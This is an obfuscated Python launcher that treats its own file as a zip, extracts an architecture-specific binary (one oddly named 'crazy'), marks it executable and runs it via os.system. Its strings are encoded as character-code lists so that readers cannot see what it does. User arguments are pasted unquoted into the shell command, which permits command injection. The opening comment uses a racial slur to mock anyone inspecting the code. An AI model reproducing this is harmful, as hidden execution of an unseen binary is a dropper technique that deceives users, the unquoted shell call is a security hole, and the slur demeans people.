
#its just a executable nig. why are you watching this😂
F=print
C=''
B=chr
A=map
import zipfile as J,os as D,shutil as L,tempfile as M,sys as E,platform as N
def G():
	O=D.path.dirname(D.path.abspath(E.argv[0]));H=M.mkdtemp()
	try:
		P=D.path.abspath(E.argv[0])
		with J.ZipFile(P,(lambda c:C.join(A(c,[114])))(B))as Q:Q.extractall(H)
		G=N.machine();K={(lambda c:C.join(A(c,[97,114,109,118,55,108])))(B):(lambda c:C.join(A(c,[97,114,109,101,97,98,105,45,118,55,97])))(B),
		                 (lambda c:C.join(A(c,[97,114,109,118,56,108])))(B):(lambda c:C.join(A(c,[97,114,109,101,97,98,105,45,118,55,97])))(B),
		                 (lambda c:C.join(A(c,[97,114,109])))(B):(lambda c:C.join(A(c,[97,114,109,101,97,98,105,45,118,55,97])))(B),
		                 (lambda c:C.join(A(c,[97,97,114,99,104,54,52])))(B):(lambda c:C.join(A(c,[99,114,97,122,121])))(B),
		                 (lambda c:C.join(A(c,[97,114,109,54,52])))(B):(lambda c:C.join(A(c,[99,114,97,122,121])))(B),
		                 (lambda c:C.join(A(c,[120,56,54])))(B):(lambda c:C.join(A(c,[120,56,54])))(B),
		                 (lambda c:C.join(A(c,[105,54,56,54])))(B):(lambda c:C.join(A(c,[120,56,54])))(B),
		                 (lambda c:C.join(A(c,[120,56,54,95,54,52])))(B):(lambda c:C.join(A(c,[120,56,54,95,54,52])))(B),
		                 (lambda c:C.join(A(c,[97,109,100,54,52])))(B):(lambda c:C.join(A(c,[120,56,54,95,54,52])))(B)}
		if G not in K:F((lambda c:C.join(A(c,[85,110,115,117,112,112,111,114,116,101,100,32,97,114,99,104,105,116,101,99,116,117,114,101,58,32,37,115])))(B)%G);E.exit(1)
		R=K[G];I=D.path.join(H,R)
		if not D.path.exists(I):F((lambda c:C.join(A(c,[69,120,112,101,99,116,101,100,32,98,105,110,97,114,121,32,102,111,114,32,37,115,32,110,111,116,32,102,111,117,110,100])))(B)%G);E.exit(1)
		D.chmod(I,493);D.chdir(O);S=(lambda c:C.join(A(c,[101,120,112,111,114,116,32,76,68,95,76,73,66,82,65,82,89,95,80,65,84,72,61,36,76,68,95,76,73,66,82,65,82,89,95,80,65,84,72,58,123,112,114,101,102,105,120,125,47,108,105,98,32,38,38,32,101,120,112,111,114,116,32,80,89,84,72,79,78,72,79,77,69,61,123,112,114,101,102,105,120,125,32,38,38,32,101,120,112,111,114,116,32,80,89,84,72,79,78,95,69,88,69,67,85,84,65,66,76,69,61,123,112,121,101,120,101,99,125,32,38,38,32,123,98,105,110,97,114,121,125,32,123,97,114,103,115,125])))(B).format(prefix=E.prefix,pyexec=E.executable,binary=I,args=(lambda c:C.join(A(c,[32])))(B).join(E.argv[1:]));D.system(S)
	except J.BadZipFile:F((lambda c:C.join(A(c,[69,114,114,111,114,58,32,84,104,101,32,122,105,112,32,102,105,108,101,32,105,115,32,99,111,114,114,117,112,116,101,100,32,111,114,32,110,111,116,32,97,32,122,105,112,32,102,105,108,101,46])))(B))
	except Exception as T:F((lambda c:C.join(A(c,[65,110,32,101,114,114,111,114,32,111,99,99,117,114,114,101,100,58,32,37,115])))(B)%T)
	finally:L.rmtree(H)
if __name__==(lambda c:C.join(A(c,[95,95,109,97,105,110,95,95])))(B):G()



